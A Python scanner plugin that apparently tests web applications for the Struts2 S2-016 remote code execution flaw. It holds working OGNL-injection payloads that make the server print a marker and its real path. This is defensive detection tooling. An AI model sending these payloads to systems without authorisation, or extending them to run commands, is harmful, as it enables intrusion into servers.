#!/usr/bin/env python3
# @Time    : 2020-04-09
# @Author  : caicai
# @File    : poc_struts2_016.py

import copy
from myscan.lib.helper.request import request
from myscan.lib.core.common import get_random_num
from myscan.lib.parse.dictdata_parser import dictdata_parser
from myscan.lib.parse.response_parser import response_parser
from myscan.config import scan_set

class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "Struts2-016"
        self.vulmsg = "Struts2-016远程代码执行"
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):
        # 添加限定条件
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return
        if self.dictdata.get("url").get("extension").lower() not in ["do","action"]:
            return

        check = b'<Struts2-vuln-Check>'
        payloads = [
            r"redirect:$%7B%23a%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23b%3d%23a.getRealPath(%22<Struts2-vuln-%22),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().print(%23b),%23matt.getWriter().print('Check>'),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D",
            r"redirect%3a%24%7b%23resp%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2c%23resp.getWriter%28%29.print%28%27<Struts2-vuln%27%2b%27-Check>%27%29%2c%23resp.getWriter%28%29.flush%28%29%2c%23resp.getWriter%28%29.close%28%29%7d",
        ]

        for payload in payloads:
            for method in ["GET","POST"]:
                headers = {
                    "Accept": "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
                    "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
                    "Content-Type": "application/x-www-form-urlencoded",
                }
                req={
                    "url":self.url+"?"+payload if method=="GET" else self.url,
                    "method":method,
                    "headers":headers,
                    "data":payload if method=="POST" else "",
                    "verify":False,
                    "timeout":10,
                }
                r=request(**req)
                if r!=None :
                    if check in r.content:
                        parser_=response_parser(r)
                        self.result.append({
                            "name": self.name,
                            "url": self.url,
                            "level": self.level,  # 0:Low  1:Medium 2:High
                            "detail": {
                                "vulmsg": self.vulmsg,
                                "request":parser_.getrequestraw(),
                                "response":parser_.getresponseraw(),
                            }
                        })
                        return
